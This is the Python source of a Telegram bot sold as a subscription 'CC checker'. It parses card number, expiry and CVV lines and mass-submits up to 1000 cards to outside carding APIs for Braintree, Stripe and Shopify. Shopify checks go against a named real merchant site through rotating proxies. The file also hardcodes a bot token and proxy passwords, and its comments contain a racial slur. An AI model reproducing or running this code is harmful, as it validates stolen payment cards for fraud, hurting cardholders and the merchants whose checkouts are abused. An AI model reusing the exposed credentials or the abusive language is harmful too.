#bot.py

##########################
#Owner:- @Abhinavinaman
# Join :- t.me/navdish_ff_store
############################
import logging
import json
import time
import uuid
import re
import httpx
import asyncio
import random
from datetime import datetime, timedelta

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler
from telegram.constants import ParseMode
from telegram.error import BadRequest

#Details Like Bot Token Nigaas 
BOT_TOKEN = "8560262173:AAE1cYkTvqpA2EvL255oIdndfYrSpguIsFk" #add your bot token 
ADMIN_ID = 8041358067  #change it and add your id
DEV_CHANNEL_URL = "https://t.me/Rudeus_ssss" #change it your username 
HYPERLINK_URL = "https://t.me/Rudeus_ssss" #change it and add your youser name 
USERS_FILE = 'users.json' #do not change it 
CODES_FILE = 'codes.json'#do not change it aslo 
FREE_MINUTES = 60 #i set to 60 minutes you can change it 
BOT_NAME = "CC_bot" #your bot name [ Add stylish Font ] 
BOT_FONT = "𝘼𝙐𝙏𝙃 𝙂𝘼𝙏𝙀𝙎" #do not change it i set this font this looking baadass 

#Proxy Config @Abhinavinaman
#Step 1 :- www.webshare.io 
#step 2 :- Create New Accounts 
#Step 3 :- You Got Proxy Add Here 
PROXIES = [
    "142.111.48.253:7030:mgrthddv:ip1dn0lb1po2", "198.23.239.134:6540:mgrthddv:ip1dn0lb1po2",
    "45.38.107.97:6014:mgrthddv:ip1dn0lb1po2", "107.172.163.27:6543:mgrthddv:ip1dn0lb1po2",
    "64.137.96.74:6641:mgrthddv:ip1dn0lb1po2", "154.203.43.247:5536:mgrthddv:ip1dn0lb1po2",
    "84.247.60.125:6095:mgrthddv:ip1dn0lb1po2", "216.10.27.159:6837:mgrthddv:ip1dn0lb1po2",
    "142.111.67.146:5611:mgrthddv:ip1dn0lb1po2", "142.147.128.93:6593:mgrthddv:ip1dn0lb1po2",
]

#Api Config [ Main Part Do Not Change Here ] 
#Nigaas Do Not Copy Api Also 
BRAINTREE_API = "https://b3-checker-production.up.railway.app/check?card="
STRIPE_V1_API = "https://chkr-api.vercel.app/api/check?cc="
STRIPE_V2_API = "http://fromdeepweb.gamer.gd/api.php?lista="
SHOPIFY_V1_API = "https://autoshopify-dark.sevalla.app/index.php"
SHOPIFY_V2_API = "https://auto-shopify-6cz4.onrender.com/index.php"
BIN_LOOKUP_API = "https://lookup.binlist.net/" #I Add This You Can Remove 
#CopyRight By @Abhinavinaman
#Only Use This Api When Others Api Dose Not Work Okayy 

#API_URL = "http://194.238.22.129:8080/b3?cc="
#BIN_URL = "https://bins.antipublic.cc/bins/"
#BRAINTREE_API = "https://darkboy-auto-stripe.onrender.com/gateway=autostripe/key=darkboy/site=pixelpixiedesigns.com/cc="
#BIN_LOOKUP = "https://bins.antipublic.cc/bins/"
#STRIPE_URL = "https://darkboy-auto-stripe.onrender.com/gateway=autostripe/key=darkboy/site=pixelpixiedesigns.com/cc="
#SH_URL = "http://kamalxd.com/Dark/shp.php"
#SHOPIFY_API = "http://kamalxd.com/Dark/shp.php"

#normal 
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)


def load_data(filepath):
    try:
        with open(filepath, 'r') as f: return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        save_data(filepath, {})
        return {}

def save_data(filepath, data):
    with open(filepath, 'w') as f: json.dump(data, f, indent=4)

def get_user_expiry(user_id):
    users = load_data(USERS_FILE)
    user_data = users.get(str(user_id))
    if user_data and 'expiry' in user_data: return datetime.fromisoformat(user_data['expiry'])
    return None

def set_user_expiry(user_id, minutes):
    users = load_data(USERS_FILE)
    user_id_str = str(user_id)
    current_expiry = get_user_expiry(user_id)
    base_time = datetime.now()
    if current_expiry and current_expiry > base_time: base_time = current_expiry
    new_expiry = base_time + timedelta(minutes=minutes)
    users[user_id_str] = {'expiry': new_expiry.isoformat()}
    save_data(USERS_FILE, users)
    return new_expiry

def is_user_premium(user_id):
    expiry = get_user_expiry(user_id)
    return expiry and expiry > datetime.now()


def hyper(text): return f"[{text}]({HYPERLINK_URL})"

def extract_cc_details(text):
    match = re.search(r'(\d{15,16})[|/\s]+(\d{1,2})[|/\s]+(\d{2,4})[|/\s]+(\d{3,4})', text)
    if match:
        ccn, mm, yy, cvv = match.groups()
        yy = "20" + yy if len(yy) == 2 else yy
        return f"{ccn}|{mm.zfill(2)}|{yy}|{cvv}"
    return None

async def get_bin_info(bin_num):
    try:
        async with httpx.AsyncClient() as client:
            response = await client.get(f"{BIN_LOOKUP_API}{bin_num}")
            if response.status_code == 200:
                data = response.json()
                if isinstance(data, dict):
                    return {
                        "info": f"{data.get('scheme', 'N/A').upper()} - {data.get('type', 'N/A').upper()}",
                        "bank": data.get('bank', {}).get('name', 'N/A').upper(),
                        "country": f"{data.get('country', {}).get('name', 'N/A').upper()} {data.get('country', {}).get('emoji', '')}"
                    }
    except Exception as e: logger.error(f"BIN lookup failed for {bin_num}: {e}")
    return {"info": "N/A", "bank": "N/A", "country": "N/A"}

#@Abhinavinaman
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if str(user.id) not in load_data(USERS_FILE):
        set_user_expiry(user.id, FREE_MINUTES)
        await update.message.reply_text(f"🎉 Welcome! Nigga |> You have received a free {FREE_MINUTES}-minute trial.")

    animation_frames = ["P", "PR", "PRI", "PRINC", "PRINCE", f" ⚡{BOT_NAME} ⚡"]
    msg = await update.message.reply_text(animation_frames[0])
    for frame in animation_frames[1:]:
        try:
            await msg.edit_text(frame)
            await asyncio.sleep(0.3)
        except BadRequest: pass
    await asyncio.sleep(0.5)

    welcome_text = (
        f"⎔ {hyper(f'𝙒𝙚𝙡𝙘𝙤𝙢𝙚, {user.first_name}')} ⎔\n\n"
        f"⎔ {hyper('𝙔𝙤𝙪𝙧 𝙐𝙨𝙚𝙧 𝙄𝘿')}: `{user.id}`\n"
        f"⎔ {hyper('𝙎𝙮𝙨𝙩𝙚𝙢 𝙎𝙩𝙖𝙩𝙪𝙨')}: 🟢 𝙊𝙣𝙡𝙞𝙣𝙚\n\n"
        f"{hyper('𝙐𝙨𝙚 𝙩𝙝𝙚 𝙗𝙪𝙩𝙩𝙤𝙣𝙨 𝙗𝙚𝙡𝙤𝙬 𝙩𝙤 𝙣𝙖𝙫𝙞𝙜𝙖𝙩𝙚.')}"
    )
    keyboard = [
        [InlineKeyboardButton(f"💎 {BOT_FONT} 💎", callback_data='gates_menu')],
        [InlineKeyboardButton("👤 𝙈𝙔 𝙄𝙉𝙁𝙊", callback_data='my_info'), InlineKeyboardButton("🎁 𝙍𝙀𝘿𝙀𝙀𝙈", callback_data='redeem_info')],
        [InlineKeyboardButton("🔗 𝘿𝙀𝙑𝙀𝙇𝙊𝙋𝙀𝙍", url=DEV_CHANNEL_URL)]
    ]
    
    await msg.edit_text(text=welcome_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown', disable_web_page_preview=True)

async def code_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ 𝙔𝙤𝙪 𝙖𝙧𝙚 𝙣𝙤𝙩 𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙.")
        return
    try:
        minutes = int(context.args[0])
        code = f"XEBEC-{uuid.uuid4().hex[:8].upper()}"
        codes = load_data(CODES_FILE)
        codes[code] = {'minutes': minutes, 'used_by': None}
        save_data(CODES_FILE, codes)
        await update.message.reply_text(f"✅ 𝘾𝙤𝙙𝙚 𝙜𝙚𝙣𝙚𝙧𝙖𝙩𝙚𝙙:\n\n`{code}`\n\n𝙂𝙧𝙖𝙣𝙩𝙨 `{minutes}` 𝙢𝙞𝙣𝙪𝙩𝙚𝙨.")
    except (IndexError, ValueError):
        await update.message.reply_text("⚠️ 𝙐𝙨𝙖𝙜𝙚: `/code <minutes>`")

async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        code = context.args[0]
        codes = load_data(CODES_FILE)
        if code in codes and codes[code]['used_by'] is None:
            minutes = codes[code]['minutes']
            new_expiry = set_user_expiry(update.effective_user.id, minutes)
            codes[code]['used_by'] = update.effective_user.id
            save_data(CODES_FILE, codes)
            await update.message.reply_text(f"✅ 𝘾𝙤𝙙𝙚 𝙧𝙚𝙙𝙚𝙚𝙢𝙚𝙙! 𝙋𝙡𝙖𝙣 𝙚𝙭𝙥𝙞𝙧𝙚𝙨 𝙤𝙣:\n`{new_expiry.strftime('%Y-%m-%d %H:%M:%S UTC')}`")
        else:
            await update.message.reply_text("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙤𝙧 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝙪𝙨𝙚𝙙 𝙘𝙤𝙙𝙚.")
    except IndexError:
        await update.message.reply_text("⚠️ 𝙐𝙨𝙖𝙜𝙚: `/redeem <code>`")

async def handle_cc_check(update: Update, context: ContextTypes.DEFAULT_TYPE, gateway_name: str, api_endpoint: str, max_cards: int):
    if not is_user_premium(update.effective_user.id):
        await update.message.reply_text("❌ 𝙔𝙤𝙪𝙧 𝙥𝙧𝙚𝙢𝙞𝙪𝙢 𝙖𝙘𝙘𝙚𝙨𝙨 𝙝𝙖𝙨 𝙚𝙭𝙥𝙞𝙧𝙚𝙙.")
        return

    is_mass_check = update.message.text.split(' ')[0].startswith('/m')
    actual_max_cards = 1000 if is_mass_check else 1
    cards = [extract_cc_details(line) for line in update.message.text.split('\n') if extract_cc_details(line)]
    
    if not cards:
        await update.message.reply_text("⚠️ 𝙋𝙡𝙚𝙖𝙨𝙚 𝙥𝙧𝙤𝙫𝙞𝙙𝙚 𝙫𝙖𝙡𝙞𝙙 𝙘𝙖𝙧𝙙 𝙙𝙚𝙩𝙖𝙞𝙡𝙨.")
        return
    if len(cards) > actual_max_cards:
        await update.message.reply_text(f"❌ 𝙈𝙖𝙭 `{actual_max_cards}` 𝙘𝙖𝙧𝙙𝙨 𝙖𝙡𝙡𝙤𝙬𝙚𝙙.")
        return

    #@Abhinavinaman
    processing_frames = ["▓▒▒▒▒", "▓▓▒▒▒", "▓▓▓▒▒", "▓▓▓▓▒", "▓▓▓▓▓"]
    base_text = (
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"[↯] 𝘾𝘼𝙍𝘿 𝘾𝙃𝙀𝘾𝙆 𝙎𝙏𝘼𝙏𝙐𝙎\n\n"
        f"[↯] 𝙎𝙩𝙖𝙩𝙪𝙨 ↯ 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜 %s\n"
        f"[↯] 𝙂𝘼𝙏𝙀 ↯ {gateway_name.upper()}\n"
        f"[↯] 𝘿𝙀𝙑   ↯ @Abhinavinaman\n"
        f"━━━━━━━━━━━━━━━━━━━"
    )
    processing_msg = await update.message.reply_text(base_text % processing_frames[0])
    
    for card in cards:
        for frame in processing_frames:
            try:
                await processing_msg.edit_text(base_text % frame)
                await asyncio.sleep(0.2)
            except BadRequest: pass

        start_time = time.time()
        proxy_to_use, proxy_status = "N/A", "N/A"
        
        try:
            async with httpx.AsyncClient(timeout=30.0) as client:
                if "Shopify" in gateway_name:
                    proxy_str = random.choice(PROXIES)
                    proxy_to_use = proxy_str.split(':')[0]
                    proxy_dict = {"http://": f"http://{proxy_str.split(':')[2]}:{proxy_str.split(':')[3]}@{proxy_str.split(':')[0]}:{proxy_str.split(':')[1]}",
                                  "https://": f"http://{proxy_str.split(':')[2]}:{proxy_str.split(':')[3]}@{proxy_str.split(':')[0]}:{proxy_str.split(':')[1]}"}
                    params = {"site": "https://cassidysworldconsignment.com", "cc": card, "proxy": proxy_str}
                    response = await client.get(api_endpoint, params=params, proxies=proxy_dict)
                    proxy_status = "LIVE"
                else:
                    response = await client.get(f"{api_endpoint}{card}")
                
                api_data = response.json()
                status = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅" if "success" in str(api_data).lower() or "approved" in str(api_data).lower() else "𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌"
                response_text = api_data.get('message', 'N/A')

        except Exception as e:
            logger.error(f"API call failed for {gateway_name}: {e}")
            status, response_text = "𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌", "Card Error"
            if proxy_to_use != "N/A": proxy_status = "DEAD"

        bin_info = await get_bin_info(card[:6])
        time_taken = f"{time.time() - start_time:.2f}s"
        
        result_text = (
            f"• 𝘾𝙖𝙧𝙙: `{card}`\n"
            f"• 𝙎𝙩𝙖𝙩𝙪𝙨: **{status}**\n"
            f"• 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚: `{response_text}`\n"
            f"{hyper('━━━━━━━━━━━━━━━━━━')}\n"
            f"{hyper('»')} 𝘽𝙞𝙣: `{card[:6]}`\n"
            f"{hyper('»')} 𝙄𝙣𝙛𝙤: `{bin_info['info']}`\n"
            f"{hyper('»')} 𝘽𝙖𝙣𝙠: `{bin_info['bank']}`\n"
            f"{hyper('»')} 𝘾𝙤𝙪𝙣𝙩𝙧𝙮: `{bin_info['country']}`\n"
            f"{hyper('━━━━━━━━━━━━━━━━━━')}\n"
            f"{hyper('»')} 𝙋𝙧𝙤𝙭𝙮: `{proxy_to_use}` • `{proxy_status}`\n"
            f"{hyper('»')} 𝙏𝙞𝙢𝙚: `{time_taken}`\n"
            f"{hyper('»')} 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝘽𝙮: {update.effective_user.first_name}\n"
            f"{hyper('»')} 𝘽𝙤𝙩 𝘽𝙮: @Abhinavinaman"
        )
        await update.message.reply_text(result_text, parse_mode='Markdown', disable_web_page_preview=True)

    await processing_msg.delete()

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user = query.from_user

    if query.data == 'start_menu':
        welcome_text = (
            f"⎔ {hyper(f'𝙒𝙚𝙡𝙘𝙤𝙢𝙚, {user.first_name}')} ⎔\n\n"
            f"⎔ {hyper('𝙔𝙤𝙪𝙧 𝙐𝙨𝙚𝙧 𝙄𝘿')}: `{user.id}`\n"
            f"⎔ {hyper('𝙎𝙮𝙨𝙩𝙚𝙢 𝙎𝙩𝙖𝙩𝙪𝙨')}: 🟢 𝙊𝙣𝙡𝙞𝙣𝙚\n\n"
            f"{hyper('𝙐𝙨𝙚 𝙩𝙝𝙚 𝙗𝙪𝙩𝙩𝙤𝙣𝙨 𝙗𝙚𝙡𝙤𝙬 𝙩𝙤 𝙣𝙖𝙫𝙞𝙜𝙖𝙩𝙚.')}"
        )
        keyboard = [
            [InlineKeyboardButton(f"💎 {BOT_FONT} 💎", callback_data='gates_menu')],
            [InlineKeyboardButton("👤 𝙈𝙔 𝙄𝙉𝙁𝙊", callback_data='my_info'), InlineKeyboardButton("🎁 𝙍𝙀𝘿𝙀𝙀𝙈", callback_data='redeem_info')],
            [InlineKeyboardButton("🔗 𝘿𝙀𝙑𝙀𝙇𝙊𝙋𝙀𝙍", url=DEV_CHANNEL_URL)]
        ]
        await query.edit_message_text(text=welcome_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown', disable_web_page_preview=True)

    elif query.data == 'my_info':
        expiry = get_user_expiry(user.id)
        status = "𝘼𝙘𝙩𝙞𝙫𝙚 ✅" if is_user_premium(user.id) else "𝙀𝙭𝙥𝙞𝙧𝙚𝙙 ❌"
        expiry_str = expiry.strftime('%Y-%m-%d %H:%M:%S UTC') if expiry else "N/A"
        info_text = (
            f"👤 **{BOT_FONT} 𝙐𝙎𝙀𝙍 𝙄𝙉𝙁𝙊**\n\n"
            f"• {hyper('𝙐𝙨𝙚𝙧 𝙄𝘿')}: `{user.id}`\n"
            f"• {hyper('𝙉𝙖𝙢𝙚')}: {user.first_name}\n"
            f"• {hyper('𝙎𝙩𝙖𝙩𝙪𝙨')}: {status}\n"
            f"• {hyper('𝙋𝙡𝙖𝙣 𝙀𝙭𝙥𝙞𝙧𝙮')}: `{expiry_str}`"
        )
        keyboard = [[InlineKeyboardButton("⬅️ 𝘽𝘼𝘾𝙆", callback_data='start_menu')]]
        await query.edit_message_text(text=info_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown', disable_web_page_preview=True)

    elif query.data == 'redeem_info':
        redeem_text = f"🎁 **𝙍𝙀𝘿𝙀𝙀𝙈 𝘾𝙊𝘿𝙀**\n\n𝙋𝙡𝙚𝙖𝙨𝙚 𝙨𝙚𝙣𝙙 `/redeem <your_code>` 𝙩𝙤 𝙖𝙘𝙩𝙞𝙫𝙖𝙩𝙚 𝙮𝙤𝙪𝙧 𝙥𝙡𝙖𝙣."
        keyboard = [[InlineKeyboardButton("⬅️ 𝘽𝘼𝘾𝙆", callback_data='start_menu')]]
        await query.edit_message_text(text=redeem_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown', disable_web_page_preview=True)

    elif query.data == 'gates_menu':
        commands_text = (
            f"💎 **{BOT_FONT}**\n\n"
            f"**𝙎𝙩𝙧𝙞𝙥𝙚 𝘼𝙪𝙩𝙝** 💎\n`/st` • 𝙎𝙞𝙣𝙜𝙡𝙚\n`/mst` • 𝙈𝙖𝙨𝙨\n\n"
            f"**𝘽𝙧𝙖𝙞𝙣𝙩𝙧𝙚𝙚 𝘼𝙪𝙩𝙝** 💎\n`/b3` • 𝙎𝙞𝙣𝙜𝙡𝙚\n`/mb3` • 𝙈𝙖𝙨𝙨\n\n"
            f"**𝙎𝙝𝙤𝙥𝙞𝙛𝙮 𝙂𝙖𝙩𝙚𝙨** 💎\n`/sh` • 𝙎𝙝𝙤𝙥𝙞𝙛𝙮 𝙫1\n`/sp` • 𝙎𝙝𝙤𝙥𝙞𝙛𝙮 𝙫2\n\n"
            f"✨ 𝘼𝙡𝙡 𝙂𝙖𝙩𝙚𝙬𝙖𝙮𝙨 𝘼𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚"
        )
        keyboard = [[InlineKeyboardButton("⬅️ 𝘽𝘼𝘾𝙆", callback_data='start_menu')]]
        await query.edit_message_text(text=commands_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown', disable_web_page_preview=True)

def setup_handlers(application: Application):
    application.add_handler(CommandHandler('start', start_command))
    application.add_handler(CommandHandler('code', code_command))
    application.add_handler(CommandHandler('redeem', redeem_command))
    
    application.add_handler(CommandHandler(['b3', 'mb3'], lambda u, c: handle_cc_check(u, c, "Braintree", BRAINTREE_API, max_cards=7)))
    application.add_handler(CommandHandler(['st', 'mst'], lambda u, c: handle_cc_check(u, c, "Stripe v1", STRIPE_V1_API, max_cards=7)))
    application.add_handler(CommandHandler(['chk', 'mchk'], lambda u, c: handle_cc_check(u, c, "Stripe v2", STRIPE_V2_API, max_cards=7)))
    application.add_handler(CommandHandler(['sh', 'msh'], lambda u, c: handle_cc_check(u, c, "Shopify v1", SHOPIFY_V1_API, max_cards=7)))
    application.add_handler(CommandHandler(['sp', 'msp'], lambda u, c: handle_cc_check(u, c, "Shopify v2", SHOPIFY_V2_API, max_cards=7)))

    application.add_handler(CallbackQueryHandler(button_handler))


#All Code By @Abhinavinaman

